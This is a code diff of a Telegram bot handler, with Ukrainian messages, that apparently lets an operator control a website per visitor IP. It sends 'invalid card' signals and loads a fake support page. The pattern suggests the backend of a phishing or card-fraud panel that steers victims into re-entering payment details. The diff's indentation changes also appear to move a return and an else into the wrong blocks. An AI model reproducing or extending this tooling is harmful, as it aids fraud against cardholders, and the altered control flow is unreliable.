@@ -2989,13 +2989,13 @@ async def admin_action_handler(call: types.CallbackQuery):
         if not ip:
             await call.answer("❌ Помилка: відсутній IP")
             return
-            
+    
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
-        
+
                 if resp.status == 200:
                     if action == 'card':
                         await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
@@ -3012,8 +3012,8 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[ERROR] {action.upper()} request failed: {e}')
                 await call.answer("❌ Помилка сервера")
         
-        print(f'[DEBUG] {action.upper()} action completed')
-        return
+                print(f'[DEBUG] {action.upper()} action completed')
+                return
     elif action == 'support':
         print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
         if not ip:
@@ -3046,10 +3046,10 @@ async def admin_action_handler(call: types.CallbackQuery):
                             )
                             await bot.send_message(admin_user_id, support_message)
                             print(f'[DEBUG] Support message sent to admin {admin_user_id}')
-                    
-                    await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
-                else:
-                    await call.answer("❌ Помилка завантаження сторінки техпідтримки")
+                        
+                        await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
+                    else:
+                        await call.answer("❌ Помилка завантаження сторінки техпідтримки")
                     
             except Exception as e:
                 print(f'[ERROR] Support request failed: {e}')
